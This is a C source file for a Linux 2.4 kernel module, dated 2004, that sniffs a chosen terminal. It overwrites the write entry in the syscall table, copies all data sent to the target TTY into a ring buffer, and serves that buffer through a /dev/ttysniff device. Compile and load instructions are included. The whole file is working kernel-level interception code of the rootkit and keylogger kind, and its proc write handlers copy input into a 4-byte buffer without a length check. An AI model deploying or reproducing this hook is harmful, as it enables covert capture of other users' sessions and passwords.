/*
  Just a simple TTY sniffing LKM for Linux 2.4
  TTY to sniff can be configured via /proc/ttysniff/*
  (default is major 4 minor 2)
  TTY data can be read from the device /dev/ttysniff
  (use the tool watchtty to do so)
  Device must exist (mknod /dev/ttysniff c 40 0)

  Programmed by Bastian Ballmann
  http://www.geektown.de
  30.06.2004

  Compile with gcc -I/usr/src/linux/include -c ttysniff.c
  Run with insmod ttysniff.o

  This program is free software; you can redistribute 
  it and/or modify it under the terms of the 
  GNU General Public License version 2 as published 
  by the Free Software Foundation.
  
  This program is distributed in the hope that it will 
  be useful, but WITHOUT ANY WARRANTY; without even 
  the implied warranty of MERCHANTABILITY or FITNESS 
  FOR A PARTICULAR PURPOSE. 
  See the GNU General Public License for more details. 
*/

#define __KERNEL__
#define MODULE
#define PROCHOOK_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <sys/syscall.h>
#include <asm/uaccess.h>

EXPORT_NO_SYMBOLS;
MODULE_LICENSE("GPL");

/* Syscall stuff */
extern void *sys_call_table[];
int (*old_write)(int, const void *, size_t);
int new_write(int, const void *, size_t);

/* TTY */
#define TTYSIZE 4
char tty_minor[TTYSIZE] = {0};
char tty_major[TTYSIZE] = {0};

/* Ring buffer to store input */
#define BUFSIZE 4096
char buffer[BUFSIZE] = {0};
int buf_in = 0;
int buf_out = 0;

/* Proc stuff */
struct proc_dir_entry *proc_dir; 
struct proc_dir_entry *proc_minor;
struct proc_dir_entry *proc_major;
int proc_read_minor(char *, char **, off_t, int, int *, void *);
int proc_write_minor(struct file *, const char *, unsigned long, void *);
int proc_read_major(char *, char **, off_t, int, int *, void *);
int proc_write_major(struct file *, const char *, unsigned long, void *);

/* Device stuff */
static int dev_open(struct inode *, struct file *); 
static int dev_close(struct inode *, struct file *); 
static int dev_read(struct file *, char *, size_t, loff_t *);

static struct file_operations fops = 
  { 
    owner:   THIS_MODULE,
    read:    dev_read,
    open:    dev_open,
    release: dev_close,
  }; 


/************************************************************************
 MAIN PART
************************************************************************/

/* Initialization */
int init_module(void)
{
  /* Default TTY */
  tty_major[0] = '4';
  tty_minor[0] = '2';

  /* Create proc dir */
  proc_dir = proc_mkdir("ttysniff", &proc_root);

  /* Create proc files */
  if(proc_dir)
    {
      proc_major = create_proc_entry("major", 0600, proc_dir);
      proc_major->owner = THIS_MODULE;
      proc_major->write_proc = proc_write_major;
      proc_major->read_proc = proc_read_major;

      proc_minor = create_proc_entry("minor", 0600, proc_dir);
      proc_minor->owner = THIS_MODULE;
      proc_minor->write_proc = proc_write_minor;
      proc_minor->read_proc = proc_read_minor;
    }

  /* Register device */
  if(register_chrdev(40, "ttysniff", &fops)) 
    return -EIO;

  /* Overwrite write syscall */
  old_write = sys_call_table[__NR_write];
  sys_call_table[__NR_write] = new_write;
  
  return 0;
}

/* Cleanup */
void cleanup_module(void)
{
  /* Remove proc dir */
  remove_proc_entry(proc_dir->name, &proc_root);

  /* Unregister device */
  unregister_chrdev(40, "ttysniff"); 

  /* Restore write syscall */
  sys_call_table[__NR_write] = old_write;
}


/************************************************************************
 Syscalls
************************************************************************/

/* 
   New write() syscall 
   Invoke the old write() syscall
   Test if data is writen to the device we should monitor
   Copy data to our ring buffer if so
*/
int new_write(int fd, const void *buf, size_t count)
{
  /* Get the inode of the filehandle */
  struct file *file = (struct file *)fget(fd);
  struct dentry *dentry = (struct dentry *)file->f_dentry;
  struct inode *inode = (struct inode *)dentry->d_inode;

  /* Invoke the old write() syscall */
  int bytes_read = old_write(fd,buf,count);

  /* Is this the TTY we shall sniff input from? */
  if( (major(inode->i_rdev) == simple_strtol(tty_major,NULL,0)) && 
      (minor(inode->i_rdev) == simple_strtol(tty_minor,NULL,0)) )
    {
      /* Copy the userland buffer byte by byte into our ring buffer */
      while(count)
	{
	  if(buf_in > BUFSIZE-1)
	      buf_in = 0;

	  get_user(buffer[buf_in++], (char*)buf++);
	  count--;
	}      
    }

  fput(file);
  return bytes_read;
}


/************************************************************************
 Proc
************************************************************************/

/* Read major number */
int proc_read_major(char *buf, char **start, off_t offset, int count, int *eof, void *data)
{
  return sprintf(buf,"%s\n",tty_major);;
}

/* Write major number */
int proc_write_major(struct file *file, const char *buf, unsigned long count, void *data)
{
  memset(tty_major,'\0',TTYSIZE);
  strncpy(tty_major,buf,count);
  return strlen(buf);
}

/* Read minor number */
int proc_read_minor(char *buf, char **start, off_t offset, int count, int *eof, void *data)
{
  return snprintf(buf,count,"%s\n",tty_minor);;
}

/* Write minor number */
int proc_write_minor(struct file *file, const char *buf, unsigned long count, void *data)
{
  memset(tty_minor,'\0',TTYSIZE);
  strncpy(tty_minor,buf,count);
  return strlen(buf);
}


/************************************************************************
 Device
************************************************************************/

/* Open the device */
static int dev_open(struct inode *i, struct file *f) 
{ 
  if(current->euid != 0)
    return -1;

  MOD_INC_USE_COUNT;
  return 0; 
} 

/* Close the device */
static int dev_close(struct inode *i, struct file *f) 
{ 
  MOD_DEC_USE_COUNT;
  return 0;
} 

/* Read from device */
static int dev_read(struct file *file, char *buf, size_t count, loff_t *pos)
{
  int bytes_read = 0;

  /* No new input? */
  if(buf_out == buf_in)
    return 0;

  if(buffer[buf_out] == 0) 
    return 0;

  /* Copy the ring buffer to the userland buffer */
  while(count && buffer[buf_out]) 
    {
      put_user(buffer[buf_out++], buf++);
      count--;
      bytes_read++;

      if(buf_out > BUFSIZE-1)
	{
	  buf_out = 0;
	  break;
	}
    }

  return bytes_read;
}
  
// [EOF]
